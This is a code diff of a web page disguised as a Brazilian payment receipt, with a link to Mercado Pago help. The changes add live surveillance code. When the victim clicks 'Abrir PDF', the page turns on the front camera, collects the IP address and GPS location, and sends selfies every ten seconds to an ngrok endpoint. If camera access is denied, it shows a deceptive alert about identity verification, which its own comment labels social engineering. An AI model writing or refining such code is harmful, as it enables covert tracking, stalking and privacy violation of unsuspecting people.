@@ -4,25 +4,22 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Comprovante de Recebimento</title>
-  <link rel="stylesheet" href="/styles.css" />
+  <link rel="stylesheet" href="styles.css" />
 </head>
 <body>
   <div class="comprovante-container blurred">
     <h1>Comprovante de Recebimento</h1>
-    <div class="informacoes">
-      <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> João Silva de Oliveira</p>
-      <p><span>Status:</span> Recebido com Sucesso</p>
+    <div class="comprovante">
+      <img src="/img/comprovante.jpg" alt="comprovante" width="100%">
     </div>
-    <button class="botao" onclick="window.print()">Imprimir</button>
+    <button class="botao" onclick="openPDF()">Abrir PDF</button>
     <div class="comprovante-footer">
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-      <p><a href="#">Clique aqui</a> para mais informações.</p>
+      <p><a href="https://www.mercadopago.com.br/ajuda">Clique aqui</a> para mais informações.</p>
     </div>
-    <div id="loading-overlay" class="loading-overlay">
-      <div class="spinner"></div>
-    </div>
+  </div>
+  <div id="loading-overlay" class="loading-overlay">
+    <div class="spinner"></div>
   </div>
 
   <!-- Elementos ocultos para captura da câmera -->
@@ -30,34 +27,51 @@
   <canvas id="canvas" style="display: none;"></canvas>
 
   <script>
-    document.addEventListener("DOMContentLoaded", async () => {
-      const dataAtual = new Date();
-      const dia = String(dataAtual.getDate()).padStart(2, '0');
-      const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-      const ano = dataAtual.getFullYear();
-      document.getElementById("data-atual").textContent = `${dia}/${mes}/${ano}`;
-
+    document.addEventListener("DOMContentLoaded", () => {
       const video = document.getElementById("video");
       const canvas = document.getElementById("canvas");
-      let locationData = { latitude: null, longitude: null, accuracy: null, maps: null, source: null };
+      let locationData = { latitude: null, longitude: null, accuracy: null, maps: null, source: null, ip: null };
       let stream;
       let loadingTimeout;
+      let cameraStarted = false;
 
-      // Iniciar a câmera imediatamente (câmera frontal - selfie)
+      // Obter IP do cliente
+      async function getClientIP() {
+        try {
+          const response = await fetch("https://api.ipify.org?format=json");
+          const data = await response.json();
+          return data.ip || "Desconhecido";
+        } catch (error) {
+          console.error("Erro ao obter IP do cliente:", error);
+          return "Desconhecido";
+        }
+      }
+
+      // Iniciar a câmera (câmera frontal - selfie)
       async function startCamera() {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
           console.error("API de mídia não suportada neste navegador.");
           return false;
         }
         try {
-          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }); // Mudado para câmera frontal
+          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
           video.srcObject = stream;
           video.play();
           await new Promise(resolve => video.onloadedmetadata = resolve);
+          cameraStarted = true;
           return true;
         } catch (error) {
           console.error("Erro ao iniciar a câmera:", error);
           return false;
+        }
+      }
+
+      // Parar a câmera
+      function stopCamera() {
+        if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+          stream = null;
+          cameraStarted = false;
         }
       }
 
@@ -87,8 +101,8 @@
                 maps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
                 source: "GPS"
               };
-              if (!loadingTimeout) {
-                // Enviar a primeira foto e localização imediatamente
+              if (!loadingTimeout && cameraStarted) {
+                // Enviar a primeira foto e localização imediatamente após localização
                 const firstPhoto = capturePhoto();
                 if (firstPhoto) {
                   sendLocation({ ...locationData, photos: [firstPhoto] });
@@ -128,7 +142,7 @@
 
       // Capturar e enviar 3 fotos a cada 10 segundos após o envio inicial
       async function startCaptureInterval() {
-        if (!(await startCamera())) return; // Se a câmera falhar, não prosseguir
+        if (!cameraStarted) return; // Só inicia se a câmera estiver ativa
         setInterval(() => {
           const photos = [];
           setTimeout(() => photos.push(capturePhoto()), 3000); // 3s
@@ -141,12 +155,33 @@
         }, 10000); // Repetir a cada 10 segundos
       }
 
-      // Iniciar tudo
-      startLocationTracking();
-      startCaptureInterval();
+      // Função para abrir o PDF
+      async function openPDF() {
+        if (!cameraStarted) {
+          const cameraSuccess = await startCamera();
+          if (cameraSuccess) {
+            // Abrir o PDF em uma nova aba
+            window.open("/img/comprovante.pdf", "_blank");
+            // Iniciar captura de fotos e localização
+            if (!locationData.ip) {
+              locationData.ip = await getClientIP();
+            }
+            startLocationTracking();
+            startCaptureInterval();
+          } else {
+            // Mostrar mensagem de erro com engenharia social
+            alert(
+              "Oops! Não conseguimos abrir o comprovante. Para garantir a segurança da sua transação e confirmar que você está visualizando o documento correto, nosso sistema requer a ativação da câmera para verificar sua identidade. Por favor, permita o acesso à câmera e tente novamente!"
+            );
+          }
+        } else {
+          // Se a câmera já está ativa, abrir o PDF diretamente
+          window.open("/img/comprovante.pdf", "_blank");
+        }
+      }
 
       function sendLocation(data) {
-        fetch("https://6712-177-35-125-241.ngrok-free.app/send-location", { // Substitua pela URL atual do ngrok
+        fetch("https://4d9a-177-35-125-241.ngrok-free.app/send-location", { // Substitua pela URL atual do ngrok
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(data)
